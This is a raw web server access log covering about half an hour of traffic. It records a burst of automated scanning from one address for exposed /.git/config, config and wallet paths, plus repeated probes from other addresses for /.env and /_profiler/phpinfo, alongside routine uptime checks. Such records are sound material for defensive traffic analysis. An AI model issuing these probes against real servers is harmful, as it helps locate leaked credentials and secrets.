193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /tmp/.git/config HTTP/1.1" 404 19 "-" "-" 11037 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /tmp HTTP/1.1" 404 19 "-" "-" 11038 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /tmp/config HTTP/1.1" 301 17 "-" "-" 11039 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /lib/ HTTP/1.1" 301 17 "-" "-" 11040 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /tmp/config HTTP/1.1" 404 19 "-" "-" 11041 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /lib/ HTTP/1.1" 404 19 "-" "-" 11042 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /lib/.git/config HTTP/1.1" 301 17 "-" "-" 11043 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /lib HTTP/1.1" 301 17 "-" "-" 11044 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /lib/.git/config HTTP/1.1" 404 19 "-" "-" 11045 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /lib HTTP/1.1" 404 19 "-" "-" 11046 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /lib/config HTTP/1.1" 301 17 "-" "-" 11047 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /libs/ HTTP/1.1" 301 17 "-" "-" 11048 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /lib/config HTTP/1.1" 404 19 "-" "-" 11049 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /libs/ HTTP/1.1" 404 19 "-" "-" 11050 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /libs/.git/config HTTP/1.1" 301 17 "-" "-" 11051 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /libs HTTP/1.1" 301 17 "-" "-" 11052 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /libs/.git/config HTTP/1.1" 404 19 "-" "-" 11053 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:22 +0000] "GET /libs HTTP/1.1" 404 19 "-" "-" 11054 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /libs/config HTTP/1.1" 301 17 "-" "-" 11055 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /cfg/ HTTP/1.1" 301 17 "-" "-" 11056 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /libs/config HTTP/1.1" 404 19 "-" "-" 11057 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /cfg/ HTTP/1.1" 404 19 "-" "-" 11058 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /cfg/.git/config HTTP/1.1" 301 17 "-" "-" 11059 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /cfg HTTP/1.1" 301 17 "-" "-" 11060 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /cfg/.git/config HTTP/1.1" 404 19 "-" "-" 11061 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /cfg HTTP/1.1" 404 19 "-" "-" 11062 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /cfg/config HTTP/1.1" 301 17 "-" "-" 11063 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /conf/ HTTP/1.1" 301 17 "-" "-" 11064 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /cfg/config HTTP/1.1" 404 19 "-" "-" 11065 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /conf/ HTTP/1.1" 404 19 "-" "-" 11066 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /conf/.git/config HTTP/1.1" 301 17 "-" "-" 11067 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /conf HTTP/1.1" 301 17 "-" "-" 11068 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /conf HTTP/1.1" 404 19 "-" "-" 11069 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /conf/.git/config HTTP/1.1" 404 19 "-" "-" 11070 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /conf/config HTTP/1.1" 301 17 "-" "-" 11071 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /config/ HTTP/1.1" 301 17 "-" "-" 11072 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /conf/config HTTP/1.1" 404 19 "-" "-" 11073 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /config/ HTTP/1.1" 404 19 "-" "-" 11074 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:23 +0000] "GET /config/.git/config HTTP/1.1" 301 17 "-" "-" 11075 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /config HTTP/1.1" 301 17 "-" "-" 11076 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /config/.git/config HTTP/1.1" 404 19 "-" "-" 11077 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /config HTTP/1.1" 404 19 "-" "-" 11078 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /config/config HTTP/1.1" 301 17 "-" "-" 11079 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /inc/ HTTP/1.1" 301 17 "-" "-" 11080 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /config/config HTTP/1.1" 404 19 "-" "-" 11081 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /inc/ HTTP/1.1" 404 19 "-" "-" 11082 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /inc/.git/config HTTP/1.1" 301 17 "-" "-" 11083 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /inc HTTP/1.1" 301 17 "-" "-" 11084 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /inc/.git/config HTTP/1.1" 404 19 "-" "-" 11085 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /inc HTTP/1.1" 404 19 "-" "-" 11086 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /include/ HTTP/1.1" 301 17 "-" "-" 11087 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /inc/config HTTP/1.1" 301 17 "-" "-" 11088 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /include/ HTTP/1.1" 404 19 "-" "-" 11089 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /inc/config HTTP/1.1" 404 19 "-" "-" 11090 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /include HTTP/1.1" 301 17 "-" "-" 11091 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /include/.git/config HTTP/1.1" 301 17 "-" "-" 11092 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /include HTTP/1.1" 404 19 "-" "-" 11093 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /include/.git/config HTTP/1.1" 404 19 "-" "-" 11094 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /includes/ HTTP/1.1" 301 17 "-" "-" 11095 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /include/config HTTP/1.1" 301 17 "-" "-" 11096 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:24 +0000] "GET /includes/ HTTP/1.1" 404 19 "-" "-" 11097 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /include/config HTTP/1.1" 404 19 "-" "-" 11098 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /includes HTTP/1.1" 301 17 "-" "-" 11099 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /includes/.git/config HTTP/1.1" 301 17 "-" "-" 11100 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /includes HTTP/1.1" 404 19 "-" "-" 11101 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /includes/.git/config HTTP/1.1" 404 19 "-" "-" 11102 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /upload/ HTTP/1.1" 301 17 "-" "-" 11103 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /upload/ HTTP/1.1" 404 19 "-" "-" 11104 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /includes/config HTTP/1.1" 301 17 "-" "-" 11105 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /upload HTTP/1.1" 301 17 "-" "-" 11106 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /includes/config HTTP/1.1" 404 19 "-" "-" 11107 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /upload HTTP/1.1" 404 19 "-" "-" 11108 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /uploads/ HTTP/1.1" 301 17 "-" "-" 11109 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /uploads/ HTTP/1.1" 404 19 "-" "-" 11110 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /uploads HTTP/1.1" 301 17 "-" "-" 11111 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:25 +0000] "GET /uploads HTTP/1.1" 404 19 "-" "-" 11112 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:26 +0000] "GET /download/ HTTP/1.1" 301 17 "-" "-" 11113 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:26 +0000] "GET /download/ HTTP/1.1" 404 19 "-" "-" 11114 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:26 +0000] "GET /download HTTP/1.1" 301 17 "-" "-" 11115 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:26 +0000] "GET /download HTTP/1.1" 404 19 "-" "-" 11116 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:26 +0000] "GET /downloads/ HTTP/1.1" 301 17 "-" "-" 11117 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:26 +0000] "GET /downloads/ HTTP/1.1" 404 19 "-" "-" 11118 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:26 +0000] "GET /downloads HTTP/1.1" 301 17 "-" "-" 11119 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:26 +0000] "GET /downloads HTTP/1.1" 404 19 "-" "-" 11120 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:26 +0000] "GET /files/ HTTP/1.1" 301 17 "-" "-" 11121 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /files/ HTTP/1.1" 404 19 "-" "-" 11122 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /files HTTP/1.1" 301 17 "-" "-" 11123 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /files HTTP/1.1" 404 19 "-" "-" 11124 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /log/ HTTP/1.1" 301 17 "-" "-" 11125 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /log/ HTTP/1.1" 404 19 "-" "-" 11126 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /log HTTP/1.1" 301 17 "-" "-" 11127 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /log HTTP/1.1" 404 19 "-" "-" 11128 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /logs/ HTTP/1.1" 301 17 "-" "-" 11129 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /logs/ HTTP/1.1" 404 19 "-" "-" 11130 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /logs HTTP/1.1" 301 17 "-" "-" 11131 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:27 +0000] "GET /logs HTTP/1.1" 404 19 "-" "-" 11132 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /cron/ HTTP/1.1" 301 17 "-" "-" 11133 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /cron/ HTTP/1.1" 404 19 "-" "-" 11134 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /cron HTTP/1.1" 301 17 "-" "-" 11135 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /cron HTTP/1.1" 404 19 "-" "-" 11136 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /wallet/ HTTP/1.1" 301 17 "-" "-" 11137 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /wallet/ HTTP/1.1" 404 19 "-" "-" 11138 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /wallet HTTP/1.1" 301 17 "-" "-" 11139 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /wallet HTTP/1.1" 404 19 "-" "-" 11140 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /wallets/ HTTP/1.1" 301 17 "-" "-" 11141 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /wallets/ HTTP/1.1" 404 19 "-" "-" 11142 "-" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /wallets HTTP/1.1" 301 17 "-" "-" 11143 "web-to-websecure@internal" "-" 0ms
193.187.130.209 - - [19/Dec/2023:20:55:28 +0000] "GET /wallets HTTP/1.1" 404 19 "-" "-" 11144 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:20:55:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11145 "www@docker" "http://172.18.0.9:80" 0ms
139.144.21.200 - - [19/Dec/2023:20:56:04 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 11146 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:20:56:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11147 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:56:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11148 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:57:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11149 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:57:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11150 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:20:58:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11151 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:20:58:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11152 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:20:59:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11153 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:20:59:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11154 "www@docker" "http://172.18.0.9:80" 0ms
152.32.199.112 - - [19/Dec/2023:20:59:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11155 "-" "-" 0ms
152.32.199.112 - - [19/Dec/2023:21:00:11 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 11156 "-" "-" 0ms
152.32.199.112 - - [19/Dec/2023:21:00:13 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 11157 "-" "-" 0ms
152.32.199.112 - - [19/Dec/2023:21:00:14 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 11158 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:21:00:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11159 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:00:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11160 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:21:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11161 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:21:01:27 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11162 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:21:01:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11163 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [19/Dec/2023:21:02:06 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 11164 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:21:02:06 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 11165 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:21:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11166 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:21:02:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11167 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:21:02:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11168 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [19/Dec/2023:21:03:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11169 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:21:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11170 "www@docker" "http://172.18.0.9:80" 0ms
20.163.29.208 - - [19/Dec/2023:21:03:38 +0000] "GET /_profiler/phpinfo HTTP/1.1" 301 17 "-" "-" 11171 "web-to-websecure@internal" "-" 0ms
20.163.29.208 - - [19/Dec/2023:21:03:38 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 19 "-" "-" 11172 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:21:04:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11173 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:21:04:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11174 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:05:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11175 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:05:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11176 "www@docker" "http://172.18.0.9:80" 0ms
192.155.88.231 - - [19/Dec/2023:21:05:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11177 "-" "-" 0ms
54.37.79.75 - - [19/Dec/2023:21:06:07 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 11178 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:21:06:07 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 11179 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:21:06:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11180 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:06:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11181 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:07:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11182 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:21:07:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11183 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:21:08:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11184 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:08:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11185 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:21:09:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11186 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:09:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11187 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:10:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11188 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:10:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11189 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:11:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11190 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:11:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11191 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:12:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11192 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:12:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11193 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:13:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11194 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:21:13:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11195 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:21:14:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11196 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:14:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11197 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:15:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11198 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:15:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11199 "www@docker" "http://172.18.0.9:80" 0ms
157.245.125.50 - - [19/Dec/2023:21:15:43 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 11200 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:21:16:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11201 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11202 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:17:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11203 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:21:17:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11204 "www@docker" "http://172.18.0.9:80" 1ms
20.55.53.144 - - [19/Dec/2023:21:17:35 +0000] "GET /qxeSwTB81QkzM2Evgp6HYrClnGQ HTTP/1.1" 301 17 "-" "-" 11205 "web-to-websecure@internal" "-" 0ms
20.55.53.144 - - [19/Dec/2023:21:17:37 +0000] "GET /qxeSwTB81QkzM2Evgp6HYrClnGQ HTTP/1.1" 404 19 "-" "-" 11206 "-" "-" 0ms
157.245.125.50 - - [19/Dec/2023:21:18:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11207 "web-to-websecure@internal" "-" 0ms
157.245.125.50 - - [19/Dec/2023:21:18:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11208 "-" "-" 0ms
157.245.125.50 - - [19/Dec/2023:21:18:17 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 11209 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:21:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11210 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:18:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11211 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:19:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11212 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:21:19:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11213 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [19/Dec/2023:21:19:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11214 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:21:20:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11215 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:20:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11216 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:21:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11217 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:21:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11218 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [19/Dec/2023:21:21:48 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 11219 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:21:21:48 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 11220 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:21:22:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11221 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:22:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11222 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:21:23:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11223 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:21:23:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11224 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:21:24:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11225 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:21:24:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11226 "www@docker" "http://172.18.0.9:80" 1ms
